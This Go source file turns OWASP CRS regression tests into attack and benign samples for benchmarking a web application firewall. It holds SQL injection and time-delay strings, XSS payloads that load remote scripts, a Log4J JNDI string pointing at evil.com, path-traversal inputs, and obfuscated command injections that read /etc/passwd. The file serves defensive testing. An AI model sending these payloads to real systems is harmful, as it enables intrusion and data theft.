package payloads

import "strings"

// ============================================================================
// OWASP CRS 回归测试集转写（第三方基准，非自造）
//
// 来源：github.com/coreruleset/coreruleset 的 tests/regression/ 目录，
// 于 2026-10-26 抓取并逐条转写以下四个规则文件：
//   REQUEST-942-APPLICATION-ATTACK-SQLI/942100.yaml  (SQLi / libinjection) 17 条
//   REQUEST-941-APPLICATION-ATTACK-XSS/941100.yaml   (XSS / libinjection)   7 条
//   REQUEST-930-APPLICATION-ATTACK-LFI/930100.yaml   (LFI)                  5 条
//   REQUEST-932-APPLICATION-ATTACK-RCE/932130.yaml   (RCE Unix 命令注入)   30 条
//   正样本小计 59 条；另有 CRS 标记为「不应触发」的负样本 8 条（测我们的误报）。
//
// 转写原则：
//   - POST 的 data 字段 → Body（去掉 var= 前缀，保留原始载荷）
//   - GET 的 uri query → Query（保留 URL 编码形态，与真实传输一致）
//   - CRS 放在自定义 Header 的样本 → Headers（我们的 WAF 会检 headers）
//   - CRS 标 no_expect_ids 的 → CRSNegativeCases（IsAttack=false）
//   - 932130 的两条 Cookie 载体样本（test 3/4）暂未转写，后续可补
//
// 与 CRS 的口径差异（如实声明）：
//   1. CRS 的 libinjection 不检查 Referer，我们检所有 header——941100-05 这条
//      负样本在我们这里会被拦，统计上表现为"误报"，实际是我们比 CRS 更激进；
//   2. CRS 用 libinjection 做语义判定，我们是正则+加权——这个差距正是本基准要量化的；
//   3. 样本依赖 CRS 特有解析的（XML 属性、IIS %uXXXX best-fit、bracket globbing），
//      我们不支持就如实计为漏报。
// ============================================================================

// CRSCases 返回 CRS 转写的攻击样本（CRS 期望触发的，共 59 条）。
func CRSCases() []Case {
	var cs []Case
	add := func(c Case) { cs = append(cs, c) }
	bc := func(id, body string) {
		add(Case{ID: id, Category: catOf(id), Name: "CRS data 载体", Method: "POST", Path: "/post", Body: body, IsAttack: true})
	}
	qc := func(id, name, query string) {
		add(Case{ID: id, Category: catOf(id), Name: name, Method: "GET", Path: "/get", Query: query, IsAttack: true})
	}
	hc := func(id, name, key, val string) {
		add(Case{ID: id, Category: catOf(id), Name: name, Method: "GET", Path: "/get",
			Headers: map[string]string{key: val}, IsAttack: true})
	}
	bodyC := func(id, name, body string) {
		add(Case{ID: id, Category: catOf(id), Name: name, Method: "POST", Path: "/post", Body: body, IsAttack: true})
	}

	// ---------------- 942100 SQLi（17 条）----------------
	bc("CRS-942100-01", "1234 OR 1=1")
	bc("CRS-942100-02", `-1839' or '1'='1`)
	bc("CRS-942100-03", `-1839" or "1"="2`)
	bc("CRS-942100-04", "2010-01-01'+sleep(20.to_i)+'")
	bc("CRS-942100-05", "EmptyValue' and 526=527")
	bc("CRS-942100-06", "foo') UNION ALL select NULL --")
	bc("CRS-942100-07", "foo')waitfor delay'5:0:20'--")
	bc("CRS-942100-08", "JKGHUKGDI8TDHLFJH72FZLFJSKFH' and sleep(12) --")
	bc("CRS-942100-09", "/path/to/file/unitests.txt') UNION ALL select NULL --")
	bc("CRS-942100-10", `1'||(select extractvalue(xmltype('<!DOCTYPE root [ <!ENTITY % toyop SYSTEM "https://coreruleset.org/">`)
	bc("CRS-942100-11", "sleep(20)")
	bc("CRS-942100-12", `unittests@coreruleset.org" sleep(10.to_i) "`)
	bc("CRS-942100-13", `" | type %SystemDrive%\\config.ini | "`)
	bc("CRS-942100-14", `"unittests@coreruleset.org"')) and (select*from(select(sleep(5)))x) --`)
	bodyC("CRS-942100-15", "XML 属性注入", `<?xml version="1.0"?><root><a probe="1234 OR 1=1"></a></root>`)
	qc("CRS-942100-16", "IIS %u2019 best-fit 单引号", "id=%u2019%20OR%201%3D1--%20-")
	qc("CRS-942100-17", "IIS %u2019 全引号变形", "id=%u2019%20or%20%u2019a%u2019%3d%u2019a")

	// ---------------- 941100 XSS（7 条）----------------
	qc("CRS-941100-01", "XML 命名空间 script", "/get/demo/xss/xml/vuln.xml.php?input=<script+xmlns=%22http://www.w3.org/1999/xhtml%22>setTimeout(%22javascript:(function+(){var+x+=+document.createElement(%5C%22script%5C%22);x.src+=+%5C%22//sdl.me/popup.js%5C%22;document.childNodes%5B0%5D.appendChild(x);}())%22,1000)%3C/script%3E&//")
	qc("CRS-941100-02", "x:script data URI", "/get/char_test?mime=text/xml&body=%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%20src=%22data:,alert(1)%22%20/%3E")
	hc("CRS-941100-03", "UA 内 x:script", "user-agent", `/char_test?mime=text/xml&body=%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%20src=%22data:,alert(1)%22%20/%3E`)
	bc("CRS-941100-06", "foo=<xss onbeforehellfreezes%3Daler%77(1)>")
	bodyC("CRS-941100-07", "XML 属性内 script", `<?xml version="1.0"?><root><a probe="<script xmlns=&quot;http://www.w3.org/1999/xhtml&quot;>setTimeout(&quot;javascript:alert(1)&quot;,1000)</script>"></a></root>`)
	qc("CRS-941100-08", "%u00ab 书名号折叠", "/?id=%u00abscript%u00bballert(1)%u00ab/script%u00bb")
	qc("CRS-941100-09", "%u2039 单书名号折叠", "/?id=%u2039script%u203aalert(1)%u2039/script%u203a")

	// ---------------- 930100 LFI（5 条）----------------
	hc("CRS-930100-01", "CRS 特征串（header 载体）", "foobarheader", "0x5c0x2e.%00/")
	qc("CRS-930100-02", "三点斜杠", "/get?foo=.../.../WINDOWS/win.ini")
	qc("CRS-930100-03", "编码三点斜杠", "/get?foo=0x2e.%000x2f0x2e.%00/WINDOWS/win.ini")
	hc("CRS-930100-04", "CRS 特征串变体（header 载体）", "foobarheader", "0x5c0x2e./")
	bodyC("CRS-930100-05", "XML 属性", `<?xml version="1.0"?><root><a probe="0x5c0x2e.%00/"></a></root>`)

	// ---------------- 932130 RCE（30 条）----------------
	qc("CRS-932130-01", "命令替换 $(cmd)", "/get?932130-1=$(cmd)")
	bc("CRS-932130-02", "932130-2=${cmd}")
	bodyC("CRS-932130-06", "Log4J 经 RCE 规则", `{"foo": "${:1337:-x$}{jndi:ldap://evil.com/webshell}"}`)
	bc("CRS-932130-07", "var=0.84622338492032948`echo${IFS}crs312``echo${IFS}34test`")
	qc("CRS-932130-08", "bracket globbing [s]", "/get?cmd=cat%20/etc/pa%5Bs%5Dswd")
	qc("CRS-932130-09", "bracket globbing [?]", "/get?cmd=cat%20/%5B%3F%5Dtc/pa%5B%3F%5Dswd")
	qc("CRS-932130-11", "bracket [s] 直接", "/get?s=/etc/pas%5Bs%5Dwd")
	qc("CRS-932130-12", "编码 bracket [p]", "/get?s=/etc/%5Bp%5Dasswd")
	qc("CRS-932130-13", "bracket [!q]", "/get?s=/etc/%5B%21q%5Dasswd")
	qc("CRS-932130-14", "bracket [m-z]", "/get?s=/etc/%5Bm-z%5Dasswd")
	qc("CRS-932130-15", "bracket [u]name", "/get?s=/usr/bin/%5Bu%5Dname+-a")
	qc("CRS-932130-16", "bracket /bi[n]/bash", "/get?exec=/bi%5Bn%5D/bash")
	qc("CRS-932130-17", "算术展开 $[2+2]", "/get?932130-17=$%5B2%2B2%5D")
	qc("CRS-932130-18", "嵌套命令替换", "/get?932130-18=echo%20%24%28echo%20%24%28cat%20%2Fetc%2Fpasswd%29%29")
	qc("CRS-932130-19", "bracket 内斜杠", "/get?932130-19=cat%20%2Fetc%2F%5Bp%2F%2F%5Dasswd")
	qc("CRS-932130-20", "bracket 双斜杠", "/get?932130-20=cat%20%2F%5Be%2F%2F%5Dtc%2F%5Bp%2F%2F%5Dasswd")
	qc("CRS-932130-21", "bracket 多斜杠", "/get?932130-21=cat%20%2F%5Be%2F%2F%2F%2F%2F%2F%2F%2F%2F%5Dtc%2F%5Bp%2F%2F%5Dasswd")
	qc("CRS-932130-22", "bracket ls", "/get?932130-22=ls%20%2Fa%5Bb%2F%2F%2F%5Dc")
	qc("CRS-932130-26", "嵌套空替换", "/get?cmd=%24%28whoami%24%28%29%29")
	qc("CRS-932130-28", "变量嵌套 ${x#{}}", "/get?var=%24%7Bx%23%7B%7D%7D")
	qc("CRS-932130-29", "PATH 嵌套", "/get?path=%24%7BPATH%23%7B%7D%2F%7D")
	qc("CRS-932130-31", "反引号入大括号", "/get?cmd=%24%7B%60id%60%7D")
	qc("CRS-932130-32", "进程替换 <(cat file)", "/get?proc=%3C%28cat%20file%29")
	qc("CRS-932130-33", "进程替换 >(tee log)", "/get?out=%3E%28tee%20log%29")
	bc("CRS-932130-35", "cmd=%24%28echo%20%24%28cat%24%28id%29%29%29")
	qc("CRS-932130-36", "bracket [!abc]", "/get?file=%2Fetc%2F%5B%21abc%5Dasswd")
	qc("CRS-932130-37", "bracket [e////]tc", "/get?path=%2F%5Be%2F%2F%2F%5Dtc")
	qc("CRS-932130-38", "bracket [a-z]in", "/get?shell=%2Fusr%2F%5Ba-z%5Din%2Fbash")
	bodyC("CRS-932130-41", "XML 属性 $(cmd)", `<?xml version="1.0"?><root><a probe="$(cmd)"></a></root>`)
	qc("CRS-932130-42", "URI 路径末段命令替换", "/path/with/%24%28echo%20%24%28cat%24%28id%29%29%29")

	return cs
}

// CRSNegativeCases 返回 CRS 标记为「不应触发」的负样本（IsAttack=false，共 8 条）。
// 口径说明：941100-05 的 payload 在 Referer 里，CRS 不检 Referer、我们检——
// 这条被拦会在统计上表现为"误报"，实际是我们比 CRS 更激进，详见文件头声明。
func CRSNegativeCases() []Case {
	var cs []Case
	add := func(c Case) { cs = append(cs, c) }
	bc := func(id, body string) {
		add(Case{ID: id, Category: "benign", Name: "CRS 负样本", Method: "POST", Path: "/post", Body: body, IsAttack: false})
	}
	qc := func(id, name, query string) {
		add(Case{ID: id, Category: "benign", Name: name, Method: "GET", Path: "/get", Query: query, IsAttack: false})
	}

	add(Case{ID: "CRS-941100-04", Category: "benign", Name: "正常 UA（CRS 负样本对照）",
		Method: "GET", Path: "/get", UA: "OWASP CRS test agent", IsAttack: false})
	add(Case{ID: "CRS-941100-05", Category: "benign", Name: "Referer 含 payload（CRS 不检，我们检）",
		Method: "GET", Path: "/get",
		Headers:  map[string]string{"referer": `/demo/xss/xml/vuln.xml.php?input=<script>setTimeout("x",1000)</script>`},
		IsAttack: false})
	bc("CRS-932130-05", "Some text (in brackets).")
	qc("CRS-932130-10", "bracket 普通文本", "/get?cmd=hello%20%5Btext%20in%20brackets%5D")
	qc("CRS-932130-24", "数学表达式 1[a/-1]", "/get?932130-24=take%20this%20math%20expression%3A%201%5Ba%2F-1%5D")
	qc("CRS-932130-25", "计算请求 a[b/1234*c]", "/get?932130-25=plase%20calculate%20the%20following%20a%5Bb%2F1234%2Ac%5D")
	qc("CRS-932130-39", "分页 page[1]", "/get?page=page%5B1%5D")
	bc("CRS-932130-40", "932130-40=data[index]")
	return cs
}

// catOf 从 CRS 样本 ID 推断攻击类别。
func catOf(id string) string {
	switch {
	case strings.Contains(id, "942100"):
		return "sqli"
	case strings.Contains(id, "941100"):
		return "xss"
	case strings.Contains(id, "930100"):
		return "path-traversal"
	case strings.Contains(id, "932130"):
		return "rce"
	}
	return "benign"
}
